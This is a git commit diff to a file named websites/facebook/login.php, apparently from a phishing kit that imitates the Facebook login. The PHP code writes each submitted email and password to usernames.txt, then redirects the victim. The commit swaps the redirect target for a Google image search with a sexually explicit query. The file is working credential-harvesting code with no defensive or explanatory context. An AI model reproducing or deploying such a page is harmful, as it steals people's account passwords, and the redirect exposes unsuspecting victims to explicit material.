1295e821dc8128fd620680019e276a15424f8267
Raja <67794098+hackers1992@users.noreply.github.com>
2020-08-11 15:33:36 +0500

    Update login.php

--- websites/facebook/login.php
+++ websites/facebook/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://google.com.pk/');
+header('Location: https://www.google.com/search?q=cum+on+nipple&sxsrf=ALeKk02tn0Gf0oGFltyqC0Ifu9XyrorYbA:1597141954057&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiP6c62-ZLrAhVV3IUKHb_GCCMQ_AUoAnoECAsQBA&biw=1360&bih=619#imgrc=sw8EHHeis-tyWM/');
 exit();
